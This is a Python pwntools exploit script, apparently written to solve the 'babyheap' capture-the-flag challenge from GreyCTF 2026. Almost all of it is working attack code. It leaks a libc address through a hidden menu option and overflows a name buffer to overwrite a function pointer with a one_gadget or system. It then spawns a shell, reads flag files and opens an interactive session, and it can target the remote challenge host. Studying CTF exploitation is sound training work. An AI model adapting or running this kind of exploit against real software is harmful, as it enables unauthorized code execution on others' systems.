#!/usr/bin/env python3
# babyheap (GreyCTF 2026, ezpz/pwn) exploit.
#
# Bug: Monkey()/Greycat() ctors do `cin >> name` into char name[32] with no
# bound -> stack/heap-vector buffer overflow. Greycats live in a contiguous
# std::vector (reserved 10). Each Greycat: {int legs@0, char name[4..35],
# pad, void(*speak)(char[])@40}, sizeof 48. talk(i) calls
# greycats[i].speak(greycats[i].name).
#
# Leak: menu option 6767 prints &malloc -> libc base (Full RELRO, PIE, NX,
# no canary).
#
# Win: overflow greycat[0].name (starts at obj+4) by 36 bytes to reach its own
# speak ptr @obj+40 and overwrite it. We overwrite speak with a one_gadget
# (clean rdi not required) OR with system after arranging a clean "/bin/sh".
# Here we overwrite greycat[0].speak with a one_gadget then talk(0).
#
# NOTE: cin >> stops at whitespace and appends a NUL, so the overflow payload
# must contain NO whitespace (space/tab/nl/0x0b/0x0c/0x0d) and NO NUL byte
# except the implicit terminator cin writes at the end.
#
# Usage:
#   ./solve.py                 -> run ./babyheap locally (prints grey{test_flag})
#   ./solve.py REMOTE          -> nc challs.nusgreyhats.org 31367 (needs network)
#
# Requires the EXACT remote libc (Ubuntu 22.04 stock glibc 2.35) for correct
# offsets. dist ships NO libc, so offsets are resolved from the local libstdc++-
# linked libc when running locally; for REMOTE supply the matching libc via
# LIBC env or place libc.so.6 next to this script.

import os, sys
from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
BIN  = os.path.join(HERE, "..", "files", "extracted", "dist-babyheap", "babyheap")
BIN  = os.path.abspath(BIN)

context.binary = BIN
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

REMOTE = "REMOTE" in sys.argv
HOST, PORT = "challs.nusgreyhats.org", 31367

# libc path: env override, else local system libc, else next to script
LIBC_PATH = os.environ.get("LIBC")
if not LIBC_PATH:
    cand = os.path.join(HERE, "libc.so.6")
    LIBC_PATH = cand if os.path.exists(cand) else "/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(LIBC_PATH, checksec=False)


def start():
    if REMOTE:
        return remote(HOST, PORT)
    return process([BIN])


def make_greycat(io, name):
    io.sendlineafter(b"3. Make greycat talk", b"2")
    io.recvuntil(b"Enter greycat name:")
    io.sendline(name)
    io.recvuntil(b"created!")


def leak_malloc(io):
    io.sendlineafter(b"3. Make greycat talk", b"6767")
    line = io.recvline().strip()
    return int(line, 16)


def talk(io, idx):
    io.sendlineafter(b"3. Make greycat talk", b"3")
    io.recvuntil(b"Greycat index:")
    io.sendline(str(idx).encode())


def main():
    io = start()

    # 1) libc leak
    malloc_addr = leak_malloc(io)
    libc.address = malloc_addr - libc.sym["malloc"]
    log.success(f"malloc   = {malloc_addr:#x}")
    log.success(f"libc base= {libc.address:#x}")
    system = libc.sym["system"]
    log.info(f"system   = {system:#x}")

    # 2) Greycat layout: legs@0, name@4 (32), pad, speak@40, size 48.
    #    Overflow greycat[0].name -> overwrite greycat[0].speak.
    #    name buffer is at obj+4; speak at obj+40 => 36 bytes from name start.
    #    Strategy A: one_gadget (no clean-arg needed).
    #    one_gadget offsets for Ubuntu 22.04 glibc 2.35 (verify per-libc):
    one_gadgets = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8, 0xebd38, 0xebd3f, 0xebd43]

    # try first one_gadget; payload must avoid whitespace/NUL bytes
    def ptr_ok(p):
        b = p.to_bytes(8, "little").rstrip(b"\x00")  # trailing nulls become cin terminator
        bad = set(b" \t\n\x0b\x0c\r\x00")
        return not (set(b) & bad)

    target = None
    for og in one_gadgets:
        cand = libc.address + og
        if ptr_ok(cand):
            target = cand
            log.info(f"one_gadget chosen: base+{og:#x} = {cand:#x}")
            break
    if target is None:
        # fallback: system, requires clean /bin/sh as arg (best effort)
        target = system
        log.warn("no clean one_gadget; falling back to system")

    pad = b"A" * 36                      # name[4..39] (32 name + 4 pad to speak)
    payload = pad + p64(target)
    # strip trailing nulls so cin doesn't choke (cin adds its own terminator)
    payload = payload.rstrip(b"\x00")

    make_greycat(io, payload)            # greycat[0] - overwrites its own speak

    talk(io, 0)                          # trigger speak(name) -> one_gadget/system

    io.sendline(b"cat /srv/app/flag.txt 2>/dev/null; cat flag.txt 2>/dev/null; cat /app/flag.txt 2>/dev/null")
    io.sendline(b"id; echo PWNED_MARKER")
    try:
        io.recvuntil(b"PWNED_MARKER", timeout=3)
    except Exception:
        pass
    io.interactive()


if __name__ == "__main__":
    main()
